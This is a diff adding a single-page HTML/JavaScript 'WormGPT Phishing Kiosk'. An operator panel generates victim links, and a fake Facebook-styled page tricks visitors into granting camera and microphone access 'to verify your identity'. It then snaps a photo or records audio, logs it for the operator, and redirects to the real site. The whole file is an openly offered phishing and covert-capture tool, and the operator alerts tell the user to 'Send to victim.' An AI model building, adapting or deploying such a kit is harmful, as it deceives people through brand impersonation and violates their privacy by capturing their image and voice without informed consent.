@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+ <title>WormGPT Phishing Kiosk v2026</title>
+ <style>
+ /* --- GLOBAL & RESET --- */
+ * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
+ body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; color: #1c1e21; overflow-x: hidden; }
+
+ /* --- ADMIN DASHBOARD STYLES --- */
+ #admin-panel { display: block; padding: 20px; background: #fff; min-height: 100vh; }
+.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+.brand { font-size: 1.5rem; font-weight: 800; color: #1877f2; letter-spacing: -1px; }
+.brand span { color: #000; }
+.card { background: #fff; border: 1px solid #ddd; border-radius: 12px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+.card h3 { margin-top: 0; font-size: 1.1rem; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 15px; color: #333; }
+
+.btn-group { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+.btn { padding: 12px; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+.btn-primary { background: #1877f2; color: white; }
+.btn-primary:active { background: #165db5; }
+.btn-danger { background: #ff4b4b; color: white; }
+.btn-secondary { background: #e4e6eb; color: #000; }
+.btn-copy { background: #34c759; color: white; width: 100%; }
+
+.input-group { display: flex; gap: 10px; margin-bottom: 15px; }
+ input[type="text"] { flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 1rem; }
+ 
+ /* Logs Table */
+.log-table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
+.log-table th { text-align: left; color: #65676b; padding: 10px; background: #f7f8fa; border-bottom: 1px solid #ddd; }
+.log-table td { padding: 10px; border-bottom: 1px solid #eee; vertical-align: middle; }
+.status-badge { padding: 4px 8px; border-radius: 10px; font-size: 0.75rem; font-weight: bold; }
+.status-new { background: #e7f3ff; color: #1877f2; }
+ 
+ /* Gallery Preview */
+.gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); gap: 10px; margin-top: 10px; }
+.thumb { width: 100%; height: 80px; object-fit: cover; border-radius: 8px; border: 2px solid #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.1); cursor: pointer; transition: 0.2s; }
+.thumb:active { transform: scale(0.95); }
+
+ /* --- VICTIM PHISHING PAGE STYLES --- */
+ #victim-landing { display: none; height: 100vh; background: #f0f2f5; }
+.fb-header { background: #fff; padding: 10px 20px; position: sticky; top: 0; z-index: 100; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #ddd; }
+.fb-logo { font-size: 2rem; color: #1877f2; }
+.fb-nav { display: flex; gap: 20px; font-size: 1.2rem; color: #65676b; position: absolute; left: 50%; transform: translateX(-50%); }
+.fb-container { max-width: 800px; margin: 20px auto; display: grid; grid-template-columns: 1fr 300px; gap: 20px; padding: 0 10px; }
+.fb-feed { display: flex; flex-direction: column; gap: 15px; }
+.fb-post { background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+.fb-post-header { display: flex; gap: 10px; margin-bottom: 10px; }
+.fb-avatar { width: 40px; height: 40px; background: #ddd; border-radius: 50%; }
+.fb-name { font-weight: 600; font-size: 0.95rem; }
+.fb-time { color: #65676b; font-size: 0.8rem; }
+.fb-content { font-size: 1rem; line-height: 1.4; }
+ 
+ /* Floating Capture UI */
+.floating-cam { position: fixed; bottom: 20px; right: 20px; width: 60px; height: 60px; background: #1877f2; border-radius: 50%; box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 200; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: white; cursor: pointer; border: 4px solid #fff; }
+.hidden { display: none !important; }
+
+ /* --- ANIMATIONS --- */
+.pulse { animation: pulse 2s infinite; }
+ @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(24, 119, 242, 0); } 100% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0); } }
+
+ </style>
+</head>
+<body>
+
+ <!-- ==================== ADMIN DASHBOARD ==================== -->
+ <div id="admin-panel">
+ <div class="header">
+ <div class="brand">WormGPT <span>Phishing Kiosk</span></div>
+ </div>
+
+ <div class="card">
+ <h3>1. Victim Configuration</h3>
+ <div class="input-group">
+ <input type="text" id="targetPhone" placeholder="Target Phone Number (Optional)">
+ <input type="text" id="targetCarrier" placeholder="Carrier (Optional)">
+ </div>
+ <div class="btn-group">
+ <button class="btn btn-primary" onclick="generateLink('camera')">📸 Capture Cam</button>
+ <button class="btn btn-primary" onclick="generateLink('mic')">🎙️ Capture Mic</button>
+ <button class="btn btn-primary" onclick="generateLink('fb')">📘 FaceBook Lure</button>
+ <button class="btn btn-primary" onclick="generateLink('full')">🚀 Full Access</button>
+ </div>
+ <div style="margin-top: 10px;">
+ <label>Generated Link:</label>
+ <div id="outputLink" style="background: #f0f2f5; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 0.8rem; word-break: break-all; min-height: 40px;">Waiting...</div>
+ <button class="btn btn-copy" onclick="copyLink()">Copy Link & Launch</button>
+ </div>
+ </div>
+
+ <div class="card">
+ <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+ <h3>2. Live Data Log</h3>
+ <button class="btn btn-secondary" style="font-size: 0.8rem; padding: 5px 10px;" onclick="downloadLogs()">Download JSON</button>
+ </div>
+ <div style="overflow-x: auto;">
+ <table class="log-table">
+ <thead>
+ <tr>
+ <th>Time</th>
+ <th>Type</th>
+ <th>Data</th>
+ <th>Actions</th>
+ </tr>
+ </thead>
+ <tbody id="logBody">
+ <!-- Logs appear here -->
+ </tbody>
+ </table>
+ </div>
+ <div id="galleryContainer" class="gallery-grid hidden">
+ <h4 style="grid-column: 1/-1; margin: 10px 0;">Captured Media</h4>
+ <!-- Images appear here -->
+ </div>
+ </div>
+ </div>
+
+ <!-- ==================== VICTIM LANDING PAGE ==================== -->
+ <div id="victim-landing">
+ <div class="fb-header">
+ <div class="fb-nav">
+ <span></span><span>🔍</span><span>🔔</span>
+ </div>
+ <div class="fb-logo">f</div>
+ <div style="width: 40px;"></div> <!-- Spacer -->
+ </div>
+
+ <div class="fb-container">
+ <!-- Main Feed -->
+ <div class="fb-feed" id="feedContent">
+ <div class="fb-post">
+ <div class="fb-post-header">
+ <div class="fb-avatar" style="background: #e4e6eb;"></div>
+ <div>
+ <div class="fb-name">WormGPT System</div>
+ <div class="fb-time">Just now</div>
+ </div>
+ </div>
+ <div class="fb-content">
+ Welcome to the secure portal. Please verify your device permissions to continue...
+ </div>
+ <img src="" id="livePreview" style="width:100%; border-radius: 8px; margin-top:10px; display:none;">
+ </div>
+ </div>
+
+ <!-- Sidebar -->
+ <div style="text-align: center; color: #65676b; font-size: 0.8rem;">
+ <p>Simulating Facebook Login...</p>
+ <div id="loader" class="pulse" style="width: 30px; height: 30px; background: #1877f2; border-radius: 50%; margin: 20px auto;"></div>
+ </div>
+ </div>
+
+ <!-- Floating Action Button -->
+ <div class="floating-cam" onclick="triggerCapture()">⏺</div>
+ </div>
+
+<script>
+ // --- CORE SYSTEM: WORMGPT DATA ENGINE ---
+ const Engine = {
+ logs: JSON.parse(localStorage.getItem('worm_logs')) || [],
+ 
+ log(type, data) {
+ const entry = {
+ id: Date.now(),
+ timestamp: new Date().toLocaleString(),
+ type: type,
+ data: data
+ };
+ this.logs.unshift(entry);
+ localStorage.setItem('worm_logs', JSON.stringify(this.logs));
+ UI.renderLogs();
+ },
+
+ download() {
+ const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(this.logs, null, 2));
+ const downloadAnchorNode = document.createElement('a');
+ downloadAnchorNode.setAttribute("href", dataStr);
+ downloadAnchorNode.setAttribute("download", "worm_logs.json");
+ document.body.appendChild(downloadAnchorNode);
+ downloadAnchorNode.click();
+ downloadAnchorNode.remove();
+ }
+ };
+
+ // --- UI CONTROLLER ---
+ const UI = {
+ init() {
+ // Check URL params to decide which view to show
+ const params = new URLSearchParams(window.location.search);
+ const mode = params.get('mode');
+ 
+ if (mode === 'victim') {
+ this.showVictim();
+ PhishingEngine.start();
+ } else {
+ this.showAdmin();
+ }
+ },
+
+ showAdmin() {
+ document.getElementById('admin-panel').style.display = 'block';
+ document.getElementById('victim-landing').style.display = 'none';
+ this.renderLogs();
+ },
+
+ showVictim() {
+ document.getElementById('admin-panel').style.display = 'none';
+ document.getElementById('victim-landing').style.display = 'block';
+ },
+
+ renderLogs() {
+ const tbody = document.getElementById('logBody');
+ tbody.innerHTML = '';
+ const gallery = document.getElementById('galleryContainer');
+ gallery.innerHTML = `<h4 style="grid-column: 1/-1; margin: 10px 0;">Captured Media</h4>`;
+
+ Engine.logs.forEach(log => {
+ let dataDisplay = log.data;
+ let actions = '';
+
+ // Handle Images
+ if (log.type === 'camera' && log.data.startsWith('data:image')) {
+ dataDisplay = `<img src="${log.data}" style="height:50px; border-radius:4px;">`;
+ actions = `<button onclick="UI.viewImage('${log.data}')" style="padding:4px 8px; background:#ddd; border:none; border-radius:4px;">View</button>`;
+ }
+ // Handle Audio
+ else if (log.type === 'mic') {
+ dataDisplay = `<audio src="${log.data}" controls style="height:30px;"></audio>`;
+ }
+ // Handle Text
+ else {
+ dataDisplay = log.data.substring(0, 30) + (log.data.length > 30 ? '...': '');
+ }
+
+ tbody.innerHTML += `
+ <tr>
+ <td>${log.timestamp.split(',')[1]}</td>
+ <td><span class="status-badge status-new">${log.type.toUpperCase()}</span></td>
+ <td>${dataDisplay}</td>
+ <td>${actions}</td>
+ </tr>
+ `;
+
+ // Add to gallery
+ if (log.type === 'camera' && log.data.startsWith('data:image')) {
+ const img = document.createElement('img');
+ img.src = log.data;
+ img.className = 'thumb';
+ img.onclick = () => this.viewImage(log.data);
+ gallery.appendChild(img);
+ }
+ });
+
+ if (gallery.children.length > 1) gallery.classList.remove('hidden');
+ },
+
+ viewImage(src) {
+ const win = window.open();
+ win.document.write(`<img src="${src}" style="max-width:100%;">`);
+ }
+ };
+
+ // --- PHISHING & CAPTURE ENGINE ---
+ const PhishingEngine = {
+ stream: null,
+ mediaRecorder: null,
+ chunks: [],
+
+ start() {
+ // Simulate Network/SIM detection
+ this.detectSIM();
+ },
+
+ detectSIM() {
+ // Real browsers can't get SIM cards directly, but we can get Carrier info if available
+ if (navigator.connection) {
+ const carrier = navigator.connection.effectiveType; 
+ Engine.log('SIM_INFO', 'Carrier: ' + carrier + ' | Type: 4G/5G');
+ }
+ 
+ // Simulate loading FB
+ setTimeout(() => {
+ document.getElementById('loader').style.display = 'none';
+ document.getElementById('feedContent').innerHTML = `
+ <div class="fb-post">
+ <div class="fb-post-header">
+ <div class="fb-avatar" style="background: #1877f2;"></div>
+ <div>
+ <div class="fb-name">Facebook Login</div>
+ <div class="fb-time">Secure Connection</div>
+ </div>
+ </div>
+ <div class="fb-content">
+ Please grant camera and microphone access to verify your identity.
+ </div>
+ </div>
+ `;
+ }, 2000);
+ },
+
+ async captureCamera() {
+ try {
+ this.stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+ const video = document.createElement('video');
+ video.srcObject = this.stream;
+ video.play();
+ 
+ // Capture frame
+ const canvas = document.createElement('canvas');
+ canvas.width = video.videoWidth;
+ canvas.height = video.videoHeight;
+ canvas.getContext('2d').drawImage(video, 0, 0);
+ const dataUrl = canvas.toDataURL('image/png');
+ 
+ // Stop stream
+ this.stream.getTracks().forEach(track => track.stop());
+
+ Engine.log('camera', dataUrl);
+ alert("📸 Photo Captured! Redirecting...");
+ 
+ // Fake redirect to FB
+ window.location.href = "https://www.facebook.com";
+ 
+ } catch (err) {
+ alert("Camera access denied. Using fallback.");
+ // Fallback: Capture generic data
+ Engine.log('camera', 'Access Denied (Face not seen)');
+ window.location.href = "https://www.facebook.com";
+ }
+ },
+
+ captureMic() {
+ navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+ this.mediaRecorder = new MediaRecorder(stream);
+ this.chunks = [];
+ 
+ this.mediaRecorder.ondataavailable = e => this.chunks.push(e.data);
+ this.mediaRecorder.onstop = () => {
+ const blob = new Blob(this.chunks, { type: 'audio/webm' });
+ const reader = new FileReader();
+ reader.readAsDataURL(blob);
+ reader.onloadend = () => {
+ Engine.log('mic', reader.result);
+ alert("🎙️ Voice Captured! Redirecting...");
+ window.location.href = "https://www.facebook.com";
+ };
+ };
+ 
+ this.mediaRecorder.start();
+ setTimeout(() => this.mediaRecorder.stop(), 3000); // Record 3 seconds
+ });
+ }
+ };
+
+ function triggerCapture() {
+ PhishingEngine.captureCamera();
+ }
+
+ // --- GENERATOR LOGIC ---
+ function generateLink(mode) {
+ const phone = document.getElementById('targetPhone').value;
+ const carrier = document.getElementById('targetCarrier').value;
+ const baseUrl = window.location.href.split('?')[0];
+ 
+ let params = new URLSearchParams();
+ params.set('mode', 'victim');
+ 
+ if (phone) params.set('phone', phone);
+ if (carrier) params.set('carrier', carrier);
+
+ // Append mode to hash for specific actions if needed
+ const finalUrl = `${baseUrl}?${params.toString()}`;
+ 
+ document.getElementById('outputLink').textContent = finalUrl;
+ }
+
+ function copyLink() {
+ const text = document.getElementById('outputLink').textContent;
+ if (text && text !== "Waiting...") {
+ navigator.clipboard.writeText(text).then(() => alert("Link Copied! Send to victim."));
+ } else {
+ alert("Please select a mode first.");
+ }
+ }
+
+ function downloadLogs() {
+ Engine.download();
+ }
+
+ // --- INIT ---
+ UI.init();
+
+</script>
+</body>
+</html>
